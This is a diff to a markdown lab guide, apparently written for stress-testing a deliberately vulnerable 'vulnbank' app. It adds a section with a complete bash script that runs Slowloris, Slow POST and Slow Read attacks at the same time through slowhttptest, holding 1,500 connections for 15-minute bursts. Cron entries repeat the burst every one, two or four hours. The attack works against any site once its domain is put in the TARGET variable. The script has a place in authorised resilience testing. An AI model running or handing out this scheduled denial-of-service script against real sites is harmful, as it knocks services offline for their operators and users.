@@ -165,7 +165,132 @@ slowhttptest \
 
 ---
 
-## Section 5 — View the Report
+## Section 5 — Run All Attacks Simultaneously on a Schedule
+
+This section runs Slowloris, Slow POST, and Slow Read **at the same time** for a 15-minute burst, then schedules that burst to repeat automatically every 1, 2, or 4 hours using `cron`.
+
+---
+
+### Step 1 — Create the Attack Script
+
+Create a reusable script that fires all 3 attacks in parallel:
+
+```bash
+nano ~/run-slowddos.sh
+```
+
+Paste the following (update `TARGET` to your actual domain):
+
+```bash
+#!/bin/bash
+
+TARGET="https://vulnbank.yourdomain.com"
+DURATION=900       # 15 minutes in seconds
+CONNECTIONS=500    # per attack type (3 × 500 = 1500 total connections)
+RATE=100           # new connections per second per attack
+
+TIMESTAMP=$(date +"%Y%m%d-%H%M%S")
+LOG_DIR=~/slowddos-logs
+mkdir -p $LOG_DIR
+
+echo "[$(date)] Starting slow DDoS burst — duration: ${DURATION}s"
+
+# Run all 3 attacks simultaneously in the background
+slowhttptest -c $CONNECTIONS -H -l $DURATION \
+  -i 10 -r $RATE -t GET -u $TARGET/ \
+  -x 24 -p 3 -g -o $LOG_DIR/slowloris-$TIMESTAMP \
+  > $LOG_DIR/slowloris-$TIMESTAMP.txt 2>&1 &
+
+slowhttptest -c $CONNECTIONS -B -l $DURATION \
+  -i 110 -r $RATE -s 8192 -u $TARGET/login \
+  -x 10 -p 3 -g -o $LOG_DIR/slowpost-$TIMESTAMP \
+  > $LOG_DIR/slowpost-$TIMESTAMP.txt 2>&1 &
+
+slowhttptest -c $CONNECTIONS -X -l $DURATION \
+  -r $RATE -u $TARGET/api/docs \
+  -p 3 -z 512 -g -o $LOG_DIR/slowread-$TIMESTAMP \
+  > $LOG_DIR/slowread-$TIMESTAMP.txt 2>&1 &
+
+echo "[$(date)] All 3 attacks launched. Logs: $LOG_DIR"
+wait
+echo "[$(date)] Burst complete."
+```
+
+Make it executable:
+
+```bash
+chmod +x ~/run-slowddos.sh
+```
+
+Test it manually first:
+
+```bash
+~/run-slowddos.sh
+```
+
+---
+
+### Step 2 — Schedule with Cron
+
+Open the cron editor:
+
+```bash
+crontab -e
+```
+
+Add **one** of the following lines depending on your preferred interval:
+
+```bash
+# Every 1 hour
+0 * * * * /home/youruser/run-slowddos.sh >> /home/youruser/slowddos-logs/cron.log 2>&1
+
+# Every 2 hours
+0 */2 * * * /home/youruser/run-slowddos.sh >> /home/youruser/slowddos-logs/cron.log 2>&1
+
+# Every 4 hours
+0 */4 * * * /home/youruser/run-slowddos.sh >> /home/youruser/slowddos-logs/cron.log 2>&1
+```
+
+> Replace `youruser` with your actual Linux username (e.g. `ubuntu`, `shaugi`).
+
+Save and exit. Verify the cron job is registered:
+
+```bash
+crontab -l
+```
+
+---
+
+### Step 3 — Monitor and Stop
+
+**Check if attacks are running:**
+
+```bash
+ps aux | grep slowhttptest
+```
+
+**Stream the latest log:**
+
+```bash
+tail -f ~/slowddos-logs/cron.log
+```
+
+**Stop all running attacks immediately:**
+
+```bash
+pkill -f slowhttptest
+```
+
+**Remove the scheduled job:**
+
+```bash
+crontab -e
+# Delete the line you added, save and exit
+```
+
+---
+
+## Section 6 — View the Report
 
 slowhttptest generates an HTML report automatically when `-g` is used:
 
